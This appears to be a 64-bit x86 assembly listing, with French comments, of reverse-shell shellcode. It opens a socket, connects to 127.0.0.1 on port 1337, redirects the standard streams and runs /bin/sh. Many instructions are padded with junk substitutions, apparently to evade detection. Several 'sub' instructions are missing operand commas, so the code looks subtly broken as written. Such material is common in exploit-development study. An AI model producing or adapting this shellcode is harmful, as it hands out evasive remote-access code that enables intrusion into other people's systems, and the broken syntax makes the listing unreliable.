BITS 64

section .data
section .text

global _start

_start:

    ;création du sys_socket 41
    ; int socket(int domain, int type, int protocol);
push 0xFF 
pop rdi 
sub rdi 0xFF 
push 0xFF 
pop rsi 
sub rsi 0xFF 
xor rdx, rdx
mov rax, 0xFF 
sub rax 0xFF

    ;param1
    mov dil, 0x2        ;famille du socket

    ;param2
    mov sil, 0x1        ;type du socket

    ;param3
    ;mov rdx, 0x4        ;protocole du socket ipv4

    mov al, 41     ;on appelle le sys_socket
    syscall


push rax
pop r12
    ;création du sys_connect 42

    ;param1

push r8
mov r8, r12
mov rdi,r8
pop r8

push r11
xor r11,r11 
mov rsi,r11 
pop r11
push r11
xor r11,r11 
mov rdx,r11 
pop r11
mov rax, 0xFF 
sub rax 0xFF

    ;param2
    mov esi, 0xffffffff ;création de l'adresse ip
    sub esi, 0xfeffff80
    push rsi
    push word 0x3905      ;port 1337 en little Endian
    push word 0x2        ;type family
    mov rsi, rsp
 

    ;param3
    mov dl, 24      ;set taille de l'@ ip

    mov al, 42         ;on appelle le sys_connect
    syscall


    ;paramétrage sys_dup2

    ;sortie0
push 0xFF 
pop rsi 
sub rsi 0xFF 
mov rax, 0xFF 
sub rax 0xFF

push r12
pop rdi
    mov sil, 0xFF   ;redirection sortie 0 vers rdi (stream)
    sub sil, 0xFF

    mov al, 33
    syscall

    ;sortie1
mov rsi, 0xFF 
sub rsi 0xFF
xor rax, rax

mov rdi, r12
    mov sil, 0x1   ;redirection sortie 1 vers rdi (stream)


    mov al, 33
    syscall

    ;sortie2
push r10
xor r10,r10 
mov rsi,r10 
pop r10
mov rax, 0xFF 
sub rax 0xFF

mov rdi, r12
    mov sil, 0x2   ;redirection sortie 2 vers rdi (stream)

    mov al, 33
    syscall


    ; 59 opcode
    ; int execve(char *fname, char **argp, char **envp);
    xor eax, eax
push rdx
xor rdx,rdx 
mov rdi,rdx 
pop rdx
push rsi
xor rsi,rsi 
mov rdx,rsi 
pop rsi
mov rsi, 0x01 
dec rsi

push rsi
mov rsi, 0x68732f6e69622f2f
mov rdi,rsi
pop rsi
    push rdx            ; délimiteur de stack à 0
    push rdi            ; insertion chaine /bin/sh en stack
    mov rdi, rsp        ; insertion du pointeur de stack dans rdi
    push rdx            ; délimiteur de stack à 0
    push rdi            ; insertion du pointeur dans la stack
    mov rsi, rsp        ; récupération du pointeur de pointeur et mise dans rsi

    add eax, 59        ;execve opcode

    syscall
    